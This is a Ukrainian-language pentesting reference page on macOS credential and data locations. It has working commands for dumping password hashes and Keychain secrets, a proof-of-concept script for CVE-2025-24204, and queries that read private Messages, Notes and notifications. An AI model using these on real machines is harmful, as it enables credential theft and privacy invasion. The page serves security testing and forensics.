# Чутливі розташування та цікаві демони macOS

{{#include ../../../banners/hacktricks-training.md}}


## Паролі

### Тіньові паролі

Тіньовий пароль зберігається разом із конфігурацією користувача у plist-файлах, розташованих у **`/var/db/dslocal/nodes/Default/users/`**.\
За допомогою наведеної нижче однорядкової команди можна вивести **всю інформацію про користувачів** (зокрема дані про хеші):

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Такі скрипти**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) або [**цей**](https://github.com/octomagon/davegrohl.git) можна використовувати, щоб перетворити хеш у **формат** **hashcat**.

Альтернативний однорядковий скрипт, який виведе облікові дані всіх неслужбових облікових записів у форматі hashcat `-m 7100` (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Ще один спосіб отримати `ShadowHashData` користувача — скористатися `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Перетворення скопійованого ShadowHashData у Linux

Якщо атрибут було скопійовано на Linux-хост для підбору паролів, збережіть у `shadowhash.hex` **лише його шістнадцяткові байти** (без мітки `ShadowHashData:`). В Ubuntu пакет `libplist-utils` перетворює декодований двійковий plist на читабельний XML без `plutil` із macOS.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

У XML використовуйте `iterations`, а також base64-значення `salt` і `entropy` з **`SALTED-SHA512-PBKDF2`**, а не окремий верифікатор SRP. Присвойте `salt_b64` і `entropy_b64` відповідний вміст XML-елементів `<data>`. Декодуйте їх у hex і сформуйте один рядок у форматі `$ml$<iterations>$<salt_hex>$<entropy_hex>` для режиму Hashcat `7100`. Це офлайн-підбір після отримання хешу з привілейованим доступом, а не метод початкового доступу чи підвищення привілеїв.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Цей файл **використовується лише** тоді, коли система запущена в **однокористувацькому режимі** (тобто не дуже часто).

### Дамп Keychain

Зверніть увагу: під час використання бінарного файла security для **dump розшифрованих паролів** користувачу кілька разів буде запропоновано дозволити цю операцію.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

У сучасній macOS найцікавішими сховищами зазвичай є **`~/Library/Keychains/login.keychain-db`** і **`/Library/Keychains/System.keychain`**. Це файли на основі SQLite, але доступ до даних у відкритому вигляді й надалі контролює **`securityd`**: викрадення необробленої бази даних дає переважно метадані й зашифровані блоки даних, якщо ви також не відновите пароль користувача, `SystemKey` або головний ключ із пам'яті.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Судячи з цього коментаря [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), схоже, що ці інструменти більше не працюють у Big Sur.

### Огляд Keychaindump

Було розроблено інструмент під назвою **keychaindump** для вилучення паролів зі зв'язок ключів macOS, але він має обмеження в новіших версіях macOS, як-от Big Sur, про що йдеться в [обговоренні](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Для використання **keychaindump** зловмиснику потрібно отримати доступ і підвищити привілеї до **root**. Інструмент використовує те, що зв'язка ключів за замовчуванням розблоковується під час входу користувача для зручності, тож програми можуть отримувати до неї доступ без повторного введення пароля користувача. Однак якщо користувач налаштує блокування зв'язки ключів після кожного використання, **keychaindump** стане неефективним.

**Keychaindump** націлюється на певний процес під назвою **securityd**, який Apple описує як демон для операцій авторизації та криптографії, необхідний для доступу до зв'язки ключів. Процес вилучення передбачає пошук **головного ключа**, отриманого з пароля входу користувача. Цей ключ потрібен для читання файла зв'язки ключів. Щоб знайти **головний ключ**, **keychaindump** сканує купу пам'яті **securityd** за допомогою команди `vmmap`, шукаючи потенційні ключі в ділянках із позначкою `MALLOC_TINY`. Для перевірки цих ділянок пам'яті використовується така команда:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Після виявлення потенційних головних ключів **keychaindump** шукає в кучах певний шаблон (`0x0000000000000018`), який вказує на можливого кандидата на роль головного ключа. Щоб використати цей ключ, потрібні додаткові кроки, зокрема деобфускація, як описано у вихідному коді **keychaindump**. Аналітикам, які працюють у цій сфері, слід пам’ятати, що критично важливі дані для розшифрування keychain зберігаються в пам’яті процесу **securityd**. Приклад команди для запуску **keychaindump**:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) може криміналістично коректно витягувати з Keychain macOS такі типи інформації:

- Хешований пароль Keychain, придатний для зламу за допомогою [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
- Інтернет-паролі
- Загальні паролі
- Приватні ключі
- Публічні ключі
- Сертифікати X509
- Захищені нотатки
- Паролі Appleshare

Якщо надати пароль для розблокування Keychain, master key, отриманий за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), чи файл розблокування, наприклад SystemKey, Chainbreaker також надасть паролі у відкритому вигляді.

Якщо не використати жоден із цих методів розблокування Keychain, Chainbreaker відобразить усю іншу доступну інформацію.

#### **Dump ключів Keychain**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump ключів keychain (із паролями) за допомогою SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Дамп ключів keychain (із паролями), злам хешу**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump ключів Keychain (із паролями) за допомогою memory dump**

[Виконайте ці кроки](../index.html#dumping-memory-with-osxpmem), щоб зробити **memory dump**.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump ключів Keychain (разом із паролями) за допомогою пароля користувача**

Якщо вам відомий пароль користувача, ви можете **зробити dump і розшифрувати Keychain, що належать цьому користувачеві**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Ключ Keychain через entitlement `gcore` (CVE-2025-24204)

У macOS 15.0 (Sequoia) файл `/usr/bin/gcore` постачався з entitlement **`com.apple.system-task-ports.read`**, тож будь-який локальний адміністратор (або шкідливий підписаний застосунок) міг знімати дамп пам’яті **будь-якого процесу, навіть за ввімкнених SIP/TCC**. Дамп `securityd` розкриває **головний ключ Keychain** у відкритому вигляді й дає змогу розшифрувати `login.keychain-db` без пароля користувача.<sup>[[1]](#references)</sup>

**Швидке відтворення на вразливих збірках (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Передайте отриманий hex-ключ Chainbreaker (`--key <hex>`), щоб розшифрувати брелок входу. Apple видалила entitlement у **macOS 15.3+**, тож це працює лише на непатчених збірках Sequoia або системах, де залишився вразливий бінарний файл.

### kcpassword

Файл **kcpassword** містить **пароль користувача для входу**, але лише якщо власник системи **увімкнув автоматичний вхід**. У такому разі користувач автоматично входитиме в систему без запиту пароля (що не надто безпечно).

Пароль зберігається у файлі **`/etc/kcpassword`** у вигляді XOR із ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ використовуватиметься повторно.\
Тому пароль досить легко відновити, наприклад за допомогою скриптів, як-от [**цей**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Цікава інформація в базах даних

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Сповіщення

До **Sequoia** сховище Notification Center зазвичай можна знайти за шляхом **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. У **Sequoia+** Apple перемістила його до захищеного TCC групового контейнера **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Більшість цікавої інформації зберігається у стовпцях **blob**, тож вам потрібно буде витягти цей вміст і перетворити його на формат, зрозумілий людині (`plutil -p -`, `strings` або невеликий парсер). Приклади швидкого аналізу:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Нещодавні проблеми з конфіденційністю (NotificationCenter DB)

- У macOS **14.7–15.1** Apple зберігала вміст банерів у SQLite `db2/db` без належного редагування. CVE **CVE-2024-44292/44293/40838/54504** дозволяли будь-якому локальному користувачу читати текст сповіщень інших користувачів, просто відкривши DB (без запиту TCC).<sup>[[3]](#references)</sup>
- Apple пом’якшила цю проблему, перемістивши DB у `group.com.apple.usernoted` і захистивши її за допомогою TCC у новіших збірках Sequoia, тож у поточних системах для її читання зазвичай потрібен відповідний контекст користувача або обхід TCC.<sup>[[4]](#references)</sup>
- На застарілих кінцевих пристроях скопіюйте файли `db`, `db-wal` і `db-shm` разом перед оновленням або перезавантаженням, якщо хочете зберегти артефакти.

### Примітки

Нотатки користувачів можна знайти в `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Якщо наведений вище однорядковий скрипт надто шумний, експортуйте `ZICNOTEDATA.ZDATA`, розпакуйте його за допомогою gunzip і розберіть protobuf: зазвичай це надійніше, ніж запускати `strings` безпосередньо для SQLite.

### Фонові завдання / елементи входу

Починаючи з **Ventura**, схвалені користувачем елементи входу та деякі фонові завдання відстежуються у сховищах **BTM**, наприклад **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** і у версійному системному кеші **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ці файли корисні для швидкого виявлення механізмів закріплення, допоміжних інструментів і деяких фонових елементів, керованих MDM:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Щодо persistence та внутрішньої будови BTM див. [сторінку про місця автозапуску](../../macos-auto-start-locations.md#login-items) і [нотатки про Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Налаштування

У macOS налаштування програм розташовані в **`$HOME/Library/Preferences`**, а в iOS — у `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

У macOS cli-інструмент **`defaults`** можна використовувати, щоб **змінювати файл налаштувань**.

**`/usr/sbin/cfprefsd`** надає служби XPC `com.apple.cfprefsd.daemon` і `com.apple.cfprefsd.agent`; його можна викликати для виконання таких дій, як зміна налаштувань.

## Файл OpenDirectory permissions.plist

Файл `/System/Library/OpenDirectory/permissions.plist` містить дозволи, застосовані до атрибутів вузлів, і захищений SIP.\
Цей файл надає конкретним користувачам дозволи за UUID (а не uid), щоб вони могли отримувати доступ до певної конфіденційної інформації, зокрема `ShadowHashData`, `HeimdalSRPKey` і `KerberosKeys`:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Системні сповіщення

### Сповіщення Darwin

Основний демон сповіщень — **`/usr/sbin/notifyd`**. Щоб отримувати сповіщення, клієнти мають зареєструватися через Mach-порт `com.apple.system.notification_center` (перевірте їх за допомогою `sudo lsmp -p <pid notifyd>`). Демон налаштовується за допомогою файлу `/etc/notify.conf`.

Назви сповіщень — це унікальні позначення у зворотній DNS-нотації. Коли сповіщення надсилається на одну з таких назв, його отримують клієнти, які вказали, що можуть його обробити.

Поточний стан (і всі назви) можна отримати, надіславши процесу notifyd сигнал SIGUSR2 і прочитавши створений файл: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Розподілений центр сповіщень

**Розподілений центр сповіщень**, основним бінарним файлом якого є **`/usr/sbin/distnoted`**, — це ще один спосіб надсилати сповіщення. Він надає кілька служб XPC і виконує певні перевірки, щоб спробувати верифікувати клієнтів.

### Push-сповіщення Apple (APN)

У цьому випадку програми можуть реєструватися для отримання **тем**. Клієнт згенерує токен, звернувшись до серверів Apple через **`apsd`**.\
Провайдери також згенерують токен і зможуть підключатися до серверів Apple, щоб надсилати повідомлення клієнтам. Ці повідомлення локально отримуватиме **`apsd`**, який пересилатиме сповіщення програмі, що очікує на нього.

Налаштування розташовані в `/Library/Preferences/com.apple.apsd.plist`.

У macOS локальна база даних повідомлень розташована в `/Library/Application\ Support/ApplePushService/aps.db`, а в iOS — у `/var/mobile/Library/ApplePushService`. Вона містить 3 таблиці: `incoming_messages`, `outgoing_messages` і `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Також можна отримати інформацію про daemon і з’єднання за допомогою:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Сповіщення користувачів

Ці сповіщення мають відображатися користувачеві на екрані:

- **`CFUserNotification`**: цей API дає змогу показати на екрані спливне вікно з повідомленням.
- **The Bulletin Board**: в iOS він показує банер, який зникає та зберігається в Notification Center.
- **`NSUserNotificationCenter`**: застаріла служба центру сповіщень у macOS. У старіших версіях база даних зазвичай розташована в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; у Sequoia та новіших версіях її перенесли до `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – entitlement macOS gcore дозволив вилучити головний ключ Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Безпека платформ Apple – захист даних Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – розкриття даних SQLite Notification Center (CVE-2024-44292 та ін.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple усуває проблеми конфіденційності, пов’язані з базою даних Notification Center у macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – злам паролів macOS](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Приклади хешів Hashcat – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
